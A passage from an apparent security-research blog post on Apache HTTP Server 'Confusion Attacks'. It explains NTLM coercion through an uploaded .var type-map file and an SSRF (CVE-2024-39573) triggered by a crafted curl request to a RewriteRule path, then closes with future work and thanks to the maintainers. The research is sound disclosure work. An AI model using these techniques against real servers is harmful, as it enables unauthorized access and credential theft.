+<p><img src="/posts/2024-08-confusion-attacks-en/444e2b7b11c6c80e-12.png"></p>
+<h4 id="✔️-Triggered-via-Type-Map"><a href="#✔️-Triggered-via-Type-Map" class="headerlink" title="✔️ Triggered via Type-Map"></a>✔️ Triggered via Type-Map</h4><p>In the <a target="_blank" rel="noopener" href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235">Debian&#x2F;Ubuntu</a> distribution of Httpd, Type-Map is enabled by default:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddHandler</span> type-map var</span><br></pre></td></tr></table></figure>
+<p>By uploading a <code>.var</code> file to the server and setting the URI field to a UNC path, you can also force the server to coerce NTLM authentication to the attacker. This is also <a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle">the second <code>.var</code> trick</a> I proposed. 😉</p>
+<h3 id="⚔️-CVE-2024-39573-SSRF-via-Full-Control-of-RewriteRule-Prefix"><a href="#⚔️-CVE-2024-39573-SSRF-via-Full-Control-of-RewriteRule-Prefix" class="headerlink" title="⚔️ CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix"></a>⚔️ CVE-2024-39573 - SSRF via Full Control of <code>RewriteRule</code> Prefix</h3><p>Lastly, when you have full control over the prefix of a <code>RewriteRule</code> substitution target in <code>Server Config</code> or <code>VirtualHost</code> is fully controllable, you can invoke <code>mod_proxy</code> and its sub-modules:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span> ^/broken(.*) $<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>Using the following URL can delegate the request to <code>mod_proxy</code> for processing:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/brokenproxy:unix:/run/[...]|http://path/to</span><br></pre></td></tr></table></figure>
+<p>But if administrators have tested the rule properly, they would realize that such rules are impractical. Thus, originally it was reported along with another vulnerability as an exploit chain, but this behavior was also treated as a security boundary fix by the security team. As the patches came out, other researchers applied the same behavior to Windows UNC and obtained another additional CVE.</p>
+<h1 id="Future-Works"><a href="#Future-Works" class="headerlink" title="Future Works"></a>Future Works</h1><p>Finally, let’s talk about future works and areas for improvement in this research. Confusion Attacks are still a very promising attack surface, especially since my research focused mainly on just two fields. Unless the Apache HTTP Server undergoes architectural improvements or provides better development standards, I believe we’ll see more “confusions” in the future!</p>
+<p>So, what other areas could be enhanced? In reality, different Httpd distributions have different configurations, so other Unix-Like systems such as the RHEL series, BSD family, and even applications that utilize Httpd might have more escapable <code>RewriteRule</code>, more powerful local gadgets, and unexpected symbolic jumps. These are all left for those interested to continue exploring.</p>
+<p>Due to time constraints, I was unable to share more real-world cases found and exploited in actual websites, devices, or even open-source projects. However, you can probably imagine — the real world is still full of countless unexplored rules, bypassable authentications, and hidden CGIs waiting to be uncovered. How to hunt these techniques worldwide? That’s your mission!</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Maintaining an open-source project is truly challenging, especially when trying to balance user convenience with the compatibility of older versions. A slight oversight can lead to the entire system being compromised, such as what happened with Httpd 2.4.49, where a minor change in path processing logic led to the disastrous <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773">CVE-2021-41773</a>. The entire development process must be carefully built upon a pile of legacy code and technical debt. So, if any Apache HTTP Server developers are reading this: Thank you for your hard work and contributions!</p>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2024
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
